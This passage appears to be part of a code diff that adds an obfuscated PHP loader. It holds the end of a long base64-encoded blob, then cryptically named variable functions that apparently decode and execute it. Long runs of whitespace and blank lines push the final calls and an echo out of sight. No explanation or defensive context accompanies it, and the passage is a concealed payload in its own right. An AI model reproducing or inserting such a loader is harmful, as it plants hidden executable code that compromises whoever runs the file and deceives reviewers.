BAHDfIc+dcRtM31iDonOlhbb28fnF8HjWjXOStGjfPRfP8Z4mc6WC8b8+LP7Pn0Ox3Ml6A0bQulzlv16ipXr/A3JfBrkYShsy/j892pLv7Se9sjPsz4L2DPOaVD9i1mm93k+P1e/CGJNzQ7zrUan2zq5zK3V3KJ1I2ZuTXymL3bKld4mVk23Qu/3BvfnRWh8B75B+1rJBzvkZx+HzCbe6wzTA81ybdE4hScYb3bJtH9530685m8qUUR6Le/rw3x35lHp6OMyfxIGZ4r0i0vpSvdcUxr8cgLiIHIF3yz4EDOTacqw16qrLiNVmZr98phe0w7g87XNO567kPO2VcgK3JsO8I48r3ctvjOcOKfqPJU9jv52ydvA7A6lCFrqitKs1FWriQH+3Joe+9VOH7cPJ2IFfwknBI9S3n1VqnTLaSDOzuhHKqYi7EATSqparS/Mw5ceBoNwnpmbK8LPCuCuJTRQzvTnCp02f2j2S+e47W96e0xv/50x8//fTX/wDYZ/b33/N3//jjI4+Xnn3Pg3/bd/j3T/T/n/531+3lv9d2+fNX/PfaDm3x7wfGz03xH3/8P+43S4g=';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
